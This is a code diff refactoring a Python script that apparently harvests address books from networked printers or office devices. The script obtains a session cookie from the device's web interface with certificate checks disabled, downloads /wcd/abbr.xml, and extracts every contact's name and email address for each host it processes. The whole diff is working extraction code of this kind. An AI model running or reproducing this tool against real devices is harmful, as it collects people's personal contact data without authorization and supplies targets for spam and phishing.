@@ -4,6 +4,7 @@ import requests
 import sys
 import json
 import os
+import xml.etree.ElementTree as ET
 
 # Suppress the "InsecureRequestWarning" about verify=False
 import warnings
@@ -26,9 +27,7 @@ def parse_args():
     return parser.parse_args()
 
 def auto_get_cookie(host, debug=False):
-    """
-    Attempt to get a cookie, first using HTTPS. If it fails, fall back to HTTP.
-    """
+    """Attempt to get a cookie, first using HTTPS. If it fails, fall back to HTTP."""
     for protocol in ["https", "http"]:
         url = f"{protocol}://{host}/wcd/index.html"
         session = requests.Session()
@@ -55,26 +54,24 @@ def auto_get_cookie(host, debug=False):
     print(f"[!] Failed to retrieve an ID cookie over both HTTPS and HTTP for {host}.")
     return None, None
 
-def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, start=1, end=50, debug=False):
-    """
-    Fetch one chunk (start..end) from /wcd/abbr.xml using the detected working protocol.
-    """
+def fetch_abbr_chunk(host, protocol, session=None, debug=False):
+    """Fetch the full address book XML using the detected working protocol."""
     url = f"{protocol}://{host}/wcd/abbr.xml"
 
     try:
-        headers = {'Cookie': cookie_value} if cookie_value else session.cookies.get_dict()
+        headers = {'Cookie': session.cookies.get_dict()} if session else {}
         if session:
             if debug:
-                print(f"[DEBUG] Fetching {start}-{end} using session cookie(s) over {protocol.upper()}.")
+                print(f"[DEBUG] Fetching address book using session cookie over {protocol.upper()}.")
             resp = session.get(url, headers=headers, verify=False, timeout=15)
         else:
             if debug:
-                print(f"[DEBUG] Fetching {start}-{end} over {protocol.upper()} with cookie:", headers)
+                print(f"[DEBUG] Fetching address book over {protocol.upper()} with headers:", headers)
             resp = requests.get(url, headers=headers, verify=False, timeout=15)
 
         if debug:
-            print(f"[DEBUG] chunk {start}-{end} -> HTTP {resp.status_code}")
-            print("[DEBUG] Response body:", resp.text[:400] + ("..." if len(resp.text) > 400 else ""))
+            print(f"[DEBUG] Response status: {resp.status_code}")
+            print(f"[DEBUG] Response body (first 500 chars): {resp.text[:500]}")
 
         if resp.status_code == 200:
             return resp.text  # Return raw XML response
@@ -85,50 +82,52 @@ def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, start=1, e
             return None
     except requests.exceptions.RequestException as e:
         if debug:
-            print(f"[DEBUG] RequestException chunk {start}-{end}: {e}")
+            print(f"[DEBUG] RequestException fetching XML: {e}")
         return None
 
-def fetch_all_abbr(host, protocol, session=None, debug=False):
-    """
-    Fetch the entire address book using the working protocol.
-    """
-    raw_xml = fetch_abbr_chunk(host, protocol, session=session, debug=debug)
-    if not raw_xml:
-        return ([], 0)
-
-    # Process the XML response
-    from xml.etree import ElementTree as ET
+def parse_xml(xml_data, debug=False):
+    """Extract Name and Email from the XML response correctly."""
     try:
-        root = ET.fromstring(raw_xml)
-        abbr_list = root.find(".//Address/AbbrList")
+        root = ET.fromstring(xml_data)
 
+        # Locate <Address>
+        address_section = root.find(".//Address")
+        if address_section is None:
+            if debug:
+                print(f"[DEBUG] No <Address> block found in XML.")
+                print(f"[DEBUG] XML Response snippet:\n{xml_data[:500]}")
+            return []
+
+        abbr_list = address_section.find("AbbrList")
         if abbr_list is None:
             if debug:
-                print(f"[DEBUG] No <AbbrList> found inside <Address> for {host}.")
-            return ([], 0)
+                print(f"[DEBUG] No <AbbrList> found inside <Address>.")
+            return []
 
-        contacts = []
+        parsed_data = []
         for addr in abbr_list.findall("AddressKind"):
+            # Get Name
             name_element = addr.find("Name")
             name = name_element.text.strip() if name_element is not None else "Unknown"
 
+            # Get Email
             send_config = addr.find("SendConfiguration")
             email = "No Email"
             if send_config is not None:
                 to_element = send_config.find("To")
                 email = to_element.text.strip() if to_element is not None else "No Email"
 
-            contacts.append((name, email))
+            parsed_data.append((name, email))
 
             if debug:
                 print(f"[DEBUG] Extracted Name: {name}, Email: {email}")
 
-        return contacts, len(contacts)
+        return parsed_data
 
     except ET.ParseError as e:
         if debug:
-            print(f"[DEBUG] XML parsing error for {host}: {e}")
-        return ([], 0)
+            print(f"[DEBUG] XML parsing error: {e}")
+        return []
 
 def process_host(host, debug=False):
     """Handles the full address book extraction for a single host."""
@@ -136,7 +135,12 @@ def process_host(host, debug=False):
     if not session:
         return
 
-    abbr_list, total_entries = fetch_all_abbr(host, protocol, session=session, debug=debug)
+    xml_data = fetch_abbr_chunk(host, protocol, session=session, debug=debug)
+    if not xml_data:
+        print(f"[!] No XML data retrieved for {host}.")
+        return
+
+    abbr_list = parse_xml(xml_data, debug=debug)
 
     if not abbr_list:
         print(f"[!] No address book entries found for {host}.")
